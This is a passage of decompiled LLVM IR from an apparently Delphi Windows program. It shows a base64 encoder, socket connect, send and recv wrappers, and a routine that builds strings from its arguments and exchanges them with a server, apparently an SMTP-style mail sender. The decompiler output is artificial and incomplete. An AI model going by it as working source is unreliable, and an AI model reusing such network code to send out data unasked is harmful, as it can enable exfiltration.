  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !858
  %25 = add i32 %24, 3, !insn.addr !859
  %26 = load i32, i32* %3, align 4, !insn.addr !856
  %27 = icmp sgt i32 %25, %26, !insn.addr !860
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !860

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !861
  %29 = inttoptr i32 %28 to i8*, !insn.addr !861
  %30 = load i8, i8* %29, align 1, !insn.addr !861
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !862
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !863
  %34 = inttoptr i32 %33 to i8*, !insn.addr !863
  %35 = load i8, i8* %34, align 1, !insn.addr !863
  store i8 %35, i8* %5, align 1, !insn.addr !864
  %36 = load i8, i8* %29, align 1, !insn.addr !865
  %37 = mul i8 %36, 16, !insn.addr !866
  %38 = and i8 %37, 48, !insn.addr !867
  %39 = add i32 %28, 1, !insn.addr !868
  %40 = inttoptr i32 %39 to i8*, !insn.addr !868
  %41 = load i8, i8* %40, align 1, !insn.addr !868
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !869
  %44 = zext i8 %43 to i32, !insn.addr !869
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !870
  %46 = inttoptr i32 %45 to i8*, !insn.addr !870
  %47 = load i8, i8* %46, align 1, !insn.addr !870
  store i8 %47, i8* %7, align 1, !insn.addr !871
  %48 = load i8, i8* %40, align 1, !insn.addr !872
  %49 = mul i8 %48, 4, !insn.addr !873
  %50 = and i8 %49, 60, !insn.addr !874
  %51 = add i32 %28, 2, !insn.addr !875
  %52 = inttoptr i32 %51 to i8*, !insn.addr !875
  %53 = load i8, i8* %52, align 1, !insn.addr !875
  %54 = udiv i8 %53, 64, !insn.addr !876
  %55 = or i8 %54, %50, !insn.addr !877
  %56 = zext i8 %55 to i32, !insn.addr !877
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !878
  %58 = inttoptr i32 %57 to i8*, !insn.addr !878
  %59 = load i8, i8* %58, align 1, !insn.addr !878
  store i8 %59, i8* %9, align 1, !insn.addr !879
  %60 = and i8 %53, 63, !insn.addr !880
  %61 = zext i8 %60 to i32, !insn.addr !880
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !881
  %63 = inttoptr i32 %62 to i8*, !insn.addr !881
  %64 = load i8, i8* %63, align 1, !insn.addr !881
  store i8 %64, i8* %11, align 1, !insn.addr !882
  br label %dec_label_pc_405589, !insn.addr !883

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !884
  %66 = icmp sgt i32 %65, %26, !insn.addr !885
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !885

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !886
  %77 = and i8 %76, 48, !insn.addr !887
  %78 = add i32 %67, 1, !insn.addr !888
  %79 = inttoptr i32 %78 to i8*, !insn.addr !888
  %80 = load i8, i8* %79, align 1, !insn.addr !888
  %81 = zext i8 %80 to i32, !insn.addr !888
  %82 = udiv i8 %80, 16, !insn.addr !889
  %83 = or i8 %82, %77, !insn.addr !890
  %84 = zext i8 %83 to i32, !insn.addr !890
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !891
  %86 = inttoptr i32 %85 to i8*, !insn.addr !891
  %87 = load i8, i8* %86, align 1, !insn.addr !891
  store i8 %87, i8* %7, align 1, !insn.addr !892
  %88 = mul i32 %81, 4, !insn.addr !893
  %89 = and i32 %88, 60, !insn.addr !894
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !895
  %91 = inttoptr i32 %90 to i8*, !insn.addr !895
  %92 = load i8, i8* %91, align 4, !insn.addr !895
  store i8 %92, i8* %9, align 1, !insn.addr !896
  store i8 61, i8* %11, align 1, !insn.addr !897
  br label %dec_label_pc_405589, !insn.addr !898

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !899
  %94 = mul i32 %93, 16, !insn.addr !900
  %95 = and i32 %94, 48, !insn.addr !901
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !902
  %97 = inttoptr i32 %96 to i8*, !insn.addr !902
  %98 = load i8, i8* %97, align 16, !insn.addr !902
  store i8 %98, i8* %7, align 1, !insn.addr !903
  store i8 61, i8* %9, align 1, !insn.addr !904
  store i8 61, i8* %11, align 1, !insn.addr !905
  br label %dec_label_pc_405589, !insn.addr !905

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !857
  %100 = inttoptr i32 %99 to i32*, !insn.addr !906
  %101 = load i32, i32* %100, align 4, !insn.addr !906
  %102 = add i32 %esp.0.reload, -4, !insn.addr !906
  %103 = inttoptr i32 %102 to i32*, !insn.addr !906
  store i32 %101, i32* %103, align 4, !insn.addr !906
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !907
  %105 = load i32, i32* %15, align 4, !insn.addr !908
  %106 = add i32 %esp.0.reload, -8, !insn.addr !908
  %107 = inttoptr i32 %106 to i32*, !insn.addr !908
  store i32 %105, i32* %107, align 4, !insn.addr !908
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !909
  %109 = load i32, i32* %17, align 4, !insn.addr !910
  %110 = add i32 %esp.0.reload, -12, !insn.addr !910
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !910
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !911
  %113 = load i32, i32* %19, align 4, !insn.addr !912
  %114 = add i32 %esp.0.reload, -16, !insn.addr !912
  %115 = inttoptr i32 %114 to i32*, !insn.addr !912
  store i32 %113, i32* %115, align 4, !insn.addr !912
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !913
  %117 = load i32, i32* %21, align 4, !insn.addr !914
  %118 = add i32 %esp.0.reload, -20, !insn.addr !914
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !914
  %120 = call i32 @"@LStrCatN"(), !insn.addr !915
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !916
  %122 = load i32, i32* %23, align 4, !insn.addr !917
  %123 = add i32 %122, -1, !insn.addr !917
  %124 = icmp eq i32 %123, 0, !insn.addr !917
  store i32 %123, i32* %23, align 4, !insn.addr !917
  %125 = icmp eq i1 %124, false, !insn.addr !918
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !918
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !918
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !918

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !919
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !920
  store i32 4216319, i32* %111, align 4, !insn.addr !921
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !922
  ret i32 %127, !insn.addr !923
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !924
  ret i32 %0, !insn.addr !924
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !925
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !926
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !927
  %0 = call i32 @function_4036c8(), !insn.addr !928
  %1 = inttoptr i32 %0 to i8*, !insn.addr !929
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !930
  %3 = call i32 @"@FillChar"(), !insn.addr !931
  %4 = icmp eq %hostent* %2, null, !insn.addr !932
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !933

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !930
  %6 = add i32 %5, 12, !insn.addr !934
  %7 = inttoptr i32 %6 to i32*, !insn.addr !934
  %8 = load i32, i32* %7, align 4, !insn.addr !934
  %9 = inttoptr i32 %8 to i32*, !insn.addr !935
  %10 = load i32, i32* %9, align 4, !insn.addr !935
  %11 = inttoptr i32 %10 to i8*, !insn.addr !936
  %12 = load i8, i8* %11, align 1, !insn.addr !936
  %13 = sext i8 %12 to i32, !insn.addr !937
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !938
  br label %dec_label_pc_405653, !insn.addr !938

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !939
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !940
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !941
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !942
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !942
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !942
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !943
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !944
  %5 = trunc i32 %4 to i16, !insn.addr !944
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !945
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !946
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !946
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !947
  %9 = icmp eq i32 %8, -1, !insn.addr !948
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !949
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !949

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !950
  %11 = trunc i32 %10 to i16, !insn.addr !951
  %12 = call i16 @htons(i16 %11), !insn.addr !951
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !952
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !952
  %14 = sext i16 %12 to i32, !insn.addr !953
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !953
  %16 = icmp eq i32 %15, 0, !insn.addr !954
  %17 = icmp eq i1 %16, false, !insn.addr !955
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !955
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !955

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !956
  store i32 %8, i32* %18, align 4, !insn.addr !956
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !957
  br label %dec_label_pc_4056f2, !insn.addr !957

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !958
  %20 = load i32, i32* %19, align 4, !insn.addr !958
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !959
  %21 = add i32 %esp.0.reload, 8, !insn.addr !960
  %22 = inttoptr i32 %21 to i32*, !insn.addr !960
  store i32 4216591, i32* %22, align 4, !insn.addr !960
  %23 = call i32 @"@LStrClr"(), !insn.addr !961
  ret i32 %23, !insn.addr !962
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !963
  ret i32 %0, !insn.addr !963
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !964
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !965
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !966
  %2 = call i32 @WSACleanup(), !insn.addr !967
  ret i32 %2, !insn.addr !968
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !969
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !970
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !970
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !970
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !971
  %4 = call i32 @function_4036c8(), !insn.addr !972
  %5 = call i32 @StrCopy(), !insn.addr !973
  %6 = call i32 @function_406fcc(i32 4), !insn.addr !974
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !975
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !976
  %9 = call i32 @"@LStrClr"(), !insn.addr !977
  ret i32 %9, !insn.addr !978
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !979
  ret i32 %0, !insn.addr !979
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !980
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !981
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !982
  %2 = call i32 @StrPas(), !insn.addr !983
  ret i32 %2, !insn.addr !984
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !985
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !985
  %esp.0.reg2mem = alloca i32, !insn.addr !985
  %ecx.0.reg2mem = alloca i32, !insn.addr !985
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !986
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !987
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !987
  br label %dec_label_pc_4057d9, !insn.addr !987

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !988
  %2 = inttoptr i32 %1 to i32*, !insn.addr !988
  store i32 0, i32* %2, align 4, !insn.addr !988
  %3 = add i32 %esp.0.reload, -8, !insn.addr !989
  %4 = inttoptr i32 %3 to i32*, !insn.addr !989
  store i32 0, i32* %4, align 4, !insn.addr !989
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !990
  %6 = icmp eq i32 %5, 0, !insn.addr !990
  %7 = icmp eq i1 %6, false, !insn.addr !991
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !991
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !991
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !991

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !992
  %9 = inttoptr i32 %8 to i32*, !insn.addr !992
  store i32 0, i32* %9, align 4, !insn.addr !992
  %10 = call i32 @function_4036b8(), !insn.addr !993
  %11 = call i32 @function_4036b8(), !insn.addr !994
  %12 = call i32 @function_4036b8(), !insn.addr !995
  %13 = call i32 @function_4036b8(), !insn.addr !996
  %14 = call i32 @function_4036b8(), !insn.addr !997
  %15 = call i32 @function_4036b8(), !insn.addr !998
  %16 = call i32 @function_4036b8(), !insn.addr !999
  %17 = add i32 %esp.0.reload, -20, !insn.addr !1000
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1000
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1000
  store i32 %19, i32* %18, align 4, !insn.addr !1000
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1001
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1001
  store i32 4217413, i32* %21, align 4, !insn.addr !1001
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1002
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1002
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1002
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1003
  %25 = call i32 @function_405664(), !insn.addr !1004
  %26 = icmp eq i32 %25, 0, !insn.addr !1005
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1006
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1006
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !1006

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1007
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1007
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !1007
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1008
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1008
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1009
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1009
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !1009
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1010
  %34 = call i32 @function_405724(), !insn.addr !1011
  %35 = call i32 @function_4057a4(), !insn.addr !1012
  %36 = call i32 @function_405724(), !insn.addr !1013
  %37 = call i32 @function_4057a4(), !insn.addr !1014
  %38 = call i32 @"@LStrCat"(), !insn.addr !1015
  %39 = call i32 @function_405724(), !insn.addr !1016
  %40 = call i32 @function_4057a4(), !insn.addr !1017
  %41 = call i32 @"@LStrCat"(), !insn.addr !1018
  %42 = call i32 @function_405724(), !insn.addr !1019
  %43 = call i32 @function_4057a4(), !insn.addr !1020
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1021
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1021
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !1021
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1022
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1022
  store i32 %arg1, i32* %47, align 4, !insn.addr !1022
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1023
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1023
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !1023
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1024
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1024
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !1024
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1025
  %53 = call i32 @function_405724(), !insn.addr !1026
  %54 = call i32 @function_4057a4(), !insn.addr !1027
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1028
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1028
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !1028
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1029
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1029
  store i32 %arg2, i32* %58, align 4, !insn.addr !1029
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1030
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1030
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !1030
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1031
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1031
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !1031
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1032
  %64 = call i32 @function_405724(), !insn.addr !1033
  %65 = call i32 @function_4057a4(), !insn.addr !1034
  %66 = call i32 @function_405724(), !insn.addr !1035
  %67 = call i32 @function_4057a4(), !insn.addr !1036
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1037
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1037
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !1037
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1038
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1038
  store i32 %arg1, i32* %71, align 4, !insn.addr !1038
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1039
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1039
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !1039
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1040
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1040
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !1040
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1041
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1041
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !1041
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1042
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1042
  store i32 %arg2, i32* %79, align 4, !insn.addr !1042
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1043
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1043
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !1043
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1044
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1044
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !1044
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1045
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1045
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !1045
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1046
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1046
  store i32 %arg3, i32* %87, align 4, !insn.addr !1046
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1047
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1047
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !1047
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1048
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1048
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !1048
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1049
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1049
  store i32 %arg4, i32* %93, align 4, !insn.addr !1049
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1050
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1050
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !1050
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1051
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1051
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !1051
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1052
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !1052
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1053
  %101 = call i32 @function_405724(), !insn.addr !1054
  %102 = call i32 @function_4057a4(), !insn.addr !1055
  %103 = call i32 @function_405724(), !insn.addr !1056
  %104 = call i32 @function_4057a4(), !insn.addr !1057
  %105 = call i32 @function_405718(), !insn.addr !1058
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1059
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1059
  br label %dec_label_pc_405a10, !insn.addr !1059

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1060
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1060
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1061
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1062
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1063
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1063
  store i32 4217420, i32* %110, align 4, !insn.addr !1063
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1064
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1065
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1066
  ret i32 %113, !insn.addr !1067
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1068
  ret i32 %0, !insn.addr !1068
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1069
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1070
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1071
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1071
  store i32 %3, i32* %4, align 4, !insn.addr !1071
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1072
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1072
  %9 = add i8 %6, %8, !insn.addr !1072
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1072
  store i8 %9, i8* %10, align 1, !insn.addr !1072
  %11 = add i32 %2, 85, !insn.addr !1073
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1073
  %13 = load i8, i8* %12, align 1, !insn.addr !1073
  %14 = trunc i32 %1 to i8, !insn.addr !1073
  %15 = add i8 %13, %14, !insn.addr !1073
  store i8 %15, i8* %12, align 1, !insn.addr !1073
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1074
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1074
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1074
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1075
  %18 = load i32, i32* @global_var_40a6b4, align 4, !insn.addr !1076
  %19 = add i32 %18, 1, !insn.addr !1076
  %20 = icmp eq i32 %19, 0, !insn.addr !1076
  store i32 %19, i32* @global_var_40a6b4, align 4, !insn.addr !1076
  %21 = icmp eq i1 %20, false, !insn.addr !1077
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1077

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1078
  %23 = call i32 @"@LStrClr"(), !insn.addr !1079
